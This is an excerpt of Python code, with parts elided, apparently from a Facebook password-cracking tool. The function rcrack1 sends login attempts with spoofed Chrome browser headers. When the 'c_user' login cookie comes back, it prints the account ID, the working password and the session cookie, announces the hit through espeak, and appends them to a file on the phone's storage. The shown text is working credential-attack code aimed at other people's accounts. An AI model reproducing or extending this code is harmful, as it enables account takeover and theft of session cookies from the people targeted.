...
def rcrack1(uid,pwx,tl):
    ...
    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="124.0.6326.224", "Google Chrome";v="124.0.6326.224"',
    'sec-ch-ua-mobile': '?0',
    ...
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6326.224 Safari/537.36',
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print('\r\r\033[1;32m[MAHAFUZ-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🍪]\x1b[38;5;254mCOOKIE = \x1b[38;5;254m'+coki+ ' ''  \x1b[38;5;254m')
                os.system("espeak \"MAHAFUZ,OK, ID \"")
                open('/sdcard/MR-MAFUZ-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                oks.append(uid)
                break
            else:
                continue
